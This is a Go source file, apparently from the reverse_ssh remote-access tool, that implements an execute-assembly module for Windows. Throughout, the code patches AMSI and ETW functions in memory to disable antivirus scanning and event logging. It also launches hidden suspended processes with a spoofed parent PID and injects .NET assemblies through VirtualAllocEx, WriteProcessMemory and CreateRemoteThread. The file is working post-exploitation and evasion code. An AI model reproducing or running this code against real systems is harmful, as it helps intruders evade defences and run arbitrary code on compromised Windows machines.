//go:build execass && windows

package execass

import (
	"bytes"
	"context"
	"crypto/sha256"
	"fmt"
	"io"
	"os/exec"
	"sync"
	"syscall"
	"time"
	"unsafe"

	"github.com/NHAS/reverse_ssh/internal/client/handlers/subsystems"
	clr "github.com/Ne0nd0g/go-clr"
	"github.com/google/shlex"
	"golang.org/x/sys/windows"
)

type platformRunner struct{}

var (
	runtimeHost *clr.ICORRuntimeHost
	assemblies  = make(map[[32]byte]*clr.MethodInfo)
	runnerMu    sync.Mutex
)

func newRunner() runner {
	return platformRunner{}
}

func (platformRunner) Run(ctx context.Context, request Request, moduleIO subsystems.ModuleIO) error {
	done := make(chan error, 1)
	go func() {
		if request.InProcess {
			done <- executeAssemblyInProcess(request, moduleIO)
			return
		}
		done <- executeAssemblyOutOfProcess(ctx, request, moduleIO)
	}()

	select {
	case err := <-done:
		return err
	case <-ctx.Done():
		return ctx.Err()
	}
}

func executeAssemblyInProcess(request Request, moduleIO subsystems.ModuleIO) error {
	parsedArgs, err := shlex.Split(request.AssemblyArgs)
	if err != nil {
		return fmt.Errorf("failed to parse assembly arguments: %w", err)
	}

	runnerMu.Lock()
	defer runnerMu.Unlock()

	if runtimeHost == nil {
		if err := initRuntimeHost(request.Runtime, moduleIO); err != nil {
			return fmt.Errorf("failed to load CLR: %w", err)
		}
	}

	hash := sha256.Sum256(request.Artifact)
	methodInfo, ok := assemblies[hash]
	if ok {
		writeLine(moduleIO, "[INF] Using cached assembly")
	} else {
		writeLine(moduleIO, "[INF] Loading assembly")
		methodInfo, err = clr.LoadAssembly(runtimeHost, request.Artifact)
		if err != nil {
			return fmt.Errorf("failed to load assembly: %w", err)
		}
		assemblies[hash] = methodInfo
	}

	writeLine(moduleIO, "[INF] Executing assembly in current process")
	stdout, stderr := clr.InvokeAssembly(methodInfo, parsedArgs)
	if stdout != "" {
		writeBlock(moduleIO, "[INF] STDOUT:", stdout)
	}
	if stderr != "" {
		writeBlock(moduleIO.Stderr(), "[INF] STDERR:", stderr)
	}
	return nil
}

func executeAssemblyOutOfProcess(ctx context.Context, request Request, moduleIO subsystems.ModuleIO) error {
	parsedProcessArgs, err := shlex.Split(request.ProcessArgs)
	if err != nil {
		return fmt.Errorf("failed to parse process arguments: %w", err)
	}

	writeLine(moduleIO, "[INF] Starting process")
	cmd := exec.CommandContext(ctx, request.ProcessName, parsedProcessArgs...)
	cmd.SysProcAttr = &windows.SysProcAttr{
		HideWindow:    true,
		CreationFlags: windows.CREATE_SUSPENDED,
	}
	parentHandle, err := spoofParent(cmd, request.ParentPID)
	if err != nil {
		writeLine(moduleIO.Stderr(), fmt.Sprintf("[ERR] Failed to spoof parent: %v", err))
	}
	if parentHandle != 0 {
		defer windows.CloseHandle(parentHandle)
	}

	var stdoutBuf, stderrBuf bytes.Buffer
	cmd.Stdout = &stdoutBuf
	cmd.Stderr = &stderrBuf

	if err := cmd.Start(); err != nil {
		return fmt.Errorf("failed to start process: %w", err)
	}
	cleanedUp := false
	defer func() {
		if !cleanedUp {
			killAndWait(cmd)
		}
	}()

	pid := cmd.Process.Pid
	writeLine(moduleIO, fmt.Sprintf("[INF] Process %q started with PID: %d", cmd.Path, pid))

	processHandle, err := windows.OpenProcess(processAccessForInjection, false, uint32(pid))
	if err != nil {
		return fmt.Errorf("failed to open process: %w", err)
	}
	defer windows.CloseHandle(processHandle)

	threadHandle, err := injectAssembly(processHandle, request.Artifact)
	if err != nil {
		return fmt.Errorf("failed to inject assembly: %w", err)
	}
	defer windows.CloseHandle(threadHandle)

	if err := waitRemoteThread(ctx, threadHandle, moduleIO); err != nil {
		return err
	}

	killAndWait(cmd)
	cleanedUp = true

	if stdout := stdoutBuf.String(); stdout != "" {
		writeBlock(moduleIO, "[INF] STDOUT:", stdout)
	}
	if stderr := stderrBuf.String(); stderr != "" {
		writeBlock(moduleIO.Stderr(), "[INF] STDERR:", stderr)
	}
	return nil
}

func killAndWait(cmd *exec.Cmd) {
	if cmd.Process == nil {
		return
	}
	_ = cmd.Process.Kill()
	_ = cmd.Wait()
}

func initRuntimeHost(runtime string, moduleIO subsystems.ModuleIO) error {
	if err := patchAmsi(moduleIO); err != nil {
		return err
	}
	if err := patchEtw(moduleIO); err != nil {
		return err
	}

	host, err := clr.LoadCLR(runtime)
	if err != nil {
		return err
	}
	if err := clr.RedirectStdoutStderr(); err != nil {
		return err
	}
	runtimeHost = host
	return nil
}

func patchAmsi(moduleIO subsystems.ModuleIO) error {
	amsiDLL := windows.NewLazyDLL("amsi.dll")
	procs := []*windows.LazyProc{
		amsiDLL.NewProc("AmsiScanBuffer"),
		amsiDLL.NewProc("AmsiInitialize"),
		amsiDLL.NewProc("AmsiScanString"),
	}
	for _, proc := range procs {
		if err := patchProcedureReturn(proc, moduleIO); err != nil {
			return err
		}
	}
	return nil
}

func patchEtw(moduleIO subsystems.ModuleIO) error {
	ntdll := windows.NewLazyDLL("ntdll.dll")
	return patchProcedureReturn(ntdll.NewProc("EtwEventWrite"), moduleIO)
}

func patchProcedureReturn(proc *windows.LazyProc, moduleIO subsystems.ModuleIO) error {
	if err := proc.Find(); err != nil {
		return err
	}

	addr := proc.Addr()
	patch := byte(0xC3)
	if *(*byte)(unsafe.Pointer(addr)) == patch {
		return nil
	}

	writeLine(moduleIO, fmt.Sprintf("[INF] Patching %s", proc.Name))
	var oldProtect uint32
	if err := windows.VirtualProtect(addr, 1, windows.PAGE_READWRITE, &oldProtect); err != nil {
		return err
	}
	*(*byte)(unsafe.Pointer(addr)) = patch
	if err := windows.VirtualProtect(addr, 1, oldProtect, &oldProtect); err != nil {
		return err
	}
	return nil
}

func spoofParent(cmd *exec.Cmd, ppid int) (windows.Handle, error) {
	if ppid == 0 {
		return 0, nil
	}
	parentHandle, err := windows.OpenProcess(windows.PROCESS_CREATE_PROCESS|windows.PROCESS_DUP_HANDLE|windows.PROCESS_QUERY_INFORMATION, false, uint32(ppid))
	if err != nil {
		return 0, err
	}
	if cmd.SysProcAttr == nil {
		cmd.SysProcAttr = &windows.SysProcAttr{}
	}
	cmd.SysProcAttr.ParentProcess = syscall.Handle(parentHandle)
	return parentHandle, nil
}

func injectAssembly(processHandle windows.Handle, blob []byte) (windows.Handle, error) {
	var threadHandle windows.Handle
	if len(blob) == 0 {
		return threadHandle, fmt.Errorf("empty assembly")
	}

	remoteAddr, err := VirtualAllocEx(processHandle, 0, uintptr(len(blob)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if err != nil {
		return threadHandle, fmt.Errorf("failed to allocate memory in process: %w", err)
	}

	var written uintptr
	if err := windows.WriteProcessMemory(processHandle, remoteAddr, &blob[0], uintptr(len(blob)), &written); err != nil {
		return threadHandle, fmt.Errorf("failed to write process memory: %w", err)
	}
	if written != uintptr(len(blob)) {
		return threadHandle, fmt.Errorf("short write to process memory: wrote %d of %d bytes", written, len(blob))
	}

	var oldProtect uint32
	if err := windows.VirtualProtectEx(processHandle, remoteAddr, uintptr(len(blob)), windows.PAGE_EXECUTE_READ, &oldProtect); err != nil {
		return threadHandle, fmt.Errorf("failed to change memory protection: %w", err)
	}

	var threadID uint32
	threadHandle, err = CreateRemoteThread(processHandle, nil, 0, remoteAddr, 0, 0, &threadID)
	if err != nil {
		return threadHandle, fmt.Errorf("failed to create remote thread: %w", err)
	}
	return threadHandle, nil
}

func waitRemoteThread(ctx context.Context, threadHandle windows.Handle, moduleIO subsystems.ModuleIO) error {
	ticker := time.NewTicker(time.Second)
	defer ticker.Stop()

	for {
		var code uint32
		if err := GetExitCodeThread(threadHandle, &code); err != nil {
			return fmt.Errorf("failed to get remote thread exit code: %w", err)
		}
		if code != stillActive {
			writeLine(moduleIO, fmt.Sprintf("[INF] Remote thread exited with code: %d", code))
			return nil
		}

		select {
		case <-ctx.Done():
			return ctx.Err()
		case <-ticker.C:
		}
	}
}

func writeLine(writer io.Writer, line string) {
	_, _ = fmt.Fprintln(writer, line)
}

func writeBlock(writer io.Writer, header, body string) {
	_, _ = fmt.Fprintf(writer, "%s\n%s\n", header, body)
}

const (
	processAccessForInjection = windows.PROCESS_CREATE_THREAD |
		windows.PROCESS_QUERY_INFORMATION |
		windows.PROCESS_VM_OPERATION |
		windows.PROCESS_VM_WRITE |
		windows.PROCESS_VM_READ
	stillActive = uint32(259)
)
